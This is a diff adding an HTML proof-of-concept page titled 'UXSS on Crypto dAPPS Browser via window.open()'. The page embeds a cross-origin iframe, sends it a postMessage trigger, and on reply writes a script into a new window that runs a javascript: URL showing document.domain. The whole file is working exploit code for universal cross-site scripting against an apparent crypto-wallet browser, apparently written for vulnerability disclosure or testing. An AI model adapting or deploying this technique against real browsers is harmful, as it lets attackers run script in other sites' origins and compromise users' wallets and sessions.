@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto dAPPS UXSS PoC</title>
+    <style>
+        html {
+            font-family: sans-serif;
+        }
+        h1 {
+            font-size: 1.8em;
+            margin-bottom: 0;
+        }
+        p {
+            margin: 5px 0;
+        }
+        #testFrame {
+            width: 95vw;
+            height: 350px;
+            border: 1px solid #ccc;
+        }
+    </style>
+</head>
+<body>
+<h1>UXSS on Crypto dAPPS Browser via window.open()</h1>
+<p>Parent page on <span id="originOutput"></span></p>
+
+<iframe id="testFrame" src="https://diff-origin.aogarantiza.com/chromiumwebview/window-open-iframe-js.html"></iframe>
+
+<script>
+    document.getElementById('originOutput').innerText = window.location.origin;
+
+    window.addEventListener('message', function(event) {
+        if (event.origin !== 'https://diff-origin.aogarantiza.com') {
+            return; // Only accept messages from the trusted origin
+        }
+        try {
+            let payload = "window.open('javascript:alert(document.domain)')";
+            let w = window.open('about:blank', '_blank');
+            w.document.write("<script>" + payload + "<\/script>");
+            w.document.close();
+        } catch (e) {
+            console.error('Exploit failed:', e);
+        }
+    }, false);
+
+    setTimeout(() => {
+        let iframe = document.getElementById('testFrame');
+        iframe.contentWindow.postMessage('trigger', 'https://diff-origin.aogarantiza.com');
+    }, 2000);
+</script>
+</body>
+</html>
